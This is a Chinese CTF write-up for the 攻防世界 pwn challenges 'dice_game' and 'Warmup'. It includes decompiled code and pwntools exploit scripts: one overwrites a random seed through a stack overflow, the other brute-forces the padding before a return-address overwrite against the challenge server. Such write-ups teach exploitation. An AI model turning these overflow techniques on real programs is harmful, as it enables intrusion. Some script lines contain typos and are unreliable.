title: 攻防世界 Pwn进阶 writeup
author: 7h4mid4
tags:
  - pwn
  - writeup
  - CTF
categories:
  - pwn
date: 2019-09-05 15:00:00
---
### dice_game

#### 查看保护

```
gdb dice_game
checksec dice_game
```
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```


#### ida源码

##### main
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[55]; // [rsp+0h] [rbp-50h]
  char v5; // [rsp+37h] [rbp-19h]
  ssize_t v6; // [rsp+38h] [rbp-18h]
  unsigned int seed[2]; // [rsp+40h] [rbp-10h]
  unsigned int v8; // [rsp+4Ch] [rbp-4h]

  memset(buf, 0, 0x30uLL);
  *(_QWORD *)seed = time(0LL);
  printf("Welcome, let me know your name: ", a2);
  fflush(stdout);
  v6 = read(0, buf, 0x50uLL);
  if ( v6 <= 49 )
    buf[v6 - 1] = 0;
  printf("Hi, %s. Let's play a game.\n", buf);
  fflush(stdout);
  srand(seed[0]);
  v8 = 1;
  v5 = 0;
  while ( 1 )
  {
    printf("Game %d/50\n", v8);
    v5 = sub_A20();
    fflush(stdout);
    if ( v5 != 1 )
      break;
    if ( v8 == 50 )
    {
      sub_B28((__int64)buf);
      break;
    }
    ++v8;
  }
  puts("Bye bye!");
  return 0LL;
}
```

#### sub_A20

```
signed __int64 sub_A20()
{
  signed __int64 result; // rax
  __int16 v1; // [rsp+Ch] [rbp-4h]
  __int16 v2; // [rsp+Eh] [rbp-2h]

  printf("Give me the point(1~6): ");
  fflush(stdout);
  _isoc99_scanf("%hd", &v1);
  if ( v1 > 0 && v1 <= 6 )
  {
    v2 = rand() % 6 + 1;
    if ( v1 <= 0 || v1 > 6 || v2 <= 0 || v2 > 6 )
      _assert_fail("(point>=1 && point<=6) && (sPoint>=1 && sPoint<=6)", "dice_game.c", 0x18u, "dice_game");
    if ( v1 == v2 )
    {
      puts("You win.");
      result = 1LL;
    }
    else
    {
      puts("You lost.");
      result = 0LL;
    }
  }
  else
  {
    puts("Invalid value!");
    result = 0LL;
  }
  return result;
}
```

#### sub_B28

```
int __fastcall sub_B28(__int64 a1)
{
  char s; // [rsp+10h] [rbp-70h]
  FILE *stream; // [rsp+78h] [rbp-8h]

  printf("Congrats %s\n", a1);
  stream = fopen("flag", "r");
  fgets(&s, 100, stream);
  puts(&s);
  return fflush(stdout);
}
```

#### 分析

对时间确定的随机数种子进行50次猜测，都正确则读取本目录下的flag。

因为对于随机数来说，只要srand()相同，那么后面的随机数就是固定的。

只要栈溢出覆盖掉随机数种子为一个固定的值，然后本地写出随机数往上填就是。

通过ida可以直观的看出填充0x40h溢出到随机数种子。

#### 随机数生成源码：

random.c

```
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

int main(int argc, char *argv[])
{
        srand(0);
        for(int i = 0;i < 50;i++)
        {
                printf("%d\n", rand()%6+1);
        }
        return 0;
}
```

```
gcc random.c -o random
```

#### exp

exp.py

```
rom pwn import *
#context.log_level = 'debug'
io = remote('111.198.29.45' , 53797)
#io = process("/.dice_game")
random = process("./random")
#code = ELF(".")
#libc = ELF("./libc-2.23.so")

def debug():
    print io.pid
    pause()
def dbg(script=''):
    gdb.attach(io, gdbscript=script)

def exploit():
    payload = 'a' * 0x40 + p64(0)
    io.recvuntil('know your name: ')
    io.sendline(payload)

    for i in range(50):
        io.recvuntil('Give me the point(1~6): ')
        number = random.recvline()
        number = int(number)
        print 'Game %d ---> %d' % (i+1, number)
        io.sendline(str(number))
    io.recvline()
    io.interactive()
exploit()

```


#### 补上网上大哥的writeup，比较简洁明了

原文链接：http://wh4lter.xyz/2019/08/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA-part1/

##### 使用ctypes模块在Python中使用C

我想这题的本意就是这样，要不然给出一个libc岂不没用？

```
from pwn import *
from ctypes import *
context.log_level = 'debug'
libc = CDLL('libc.so.6')
p = process('dice_game')
p.sendlineafter('let me know your name:','A'*0x40+p64(0))
for i in range(50):
    randvalue = libc.rand(0)%6+1
    p.sendlineafter('Give me the point(1~6):',str(randvalue))
p.interactive()
```


### Warmup

爆破栈溢出的空间

#### exp：

```
from pwn import *

# context.log_level = 'debug'
payload =65 * 'A' + p64(0X40060D)
vuln_addr = ''
i = 1

while 1:
    log.info('testing padding = ' + str(i))
    r = remote('111.198.29.45', 41241)
    r.recvuntil('WOW:')
    vuln_addr = int(r.recvline()[:-1], 16)
    print payload
    r.sendline(payload)
    i += 1
    try:
        flag = r.recvline()
        print flag
        break
    except:
        payload = 'A' + payload
    r.close()
```

从1开始爆破会在`‘A’ * 64`的时候重新执行main函数，所以第二次开始把爆破起始点选择在`‘A’ * 65`的地方。
在填充72个A的时候爆出flag。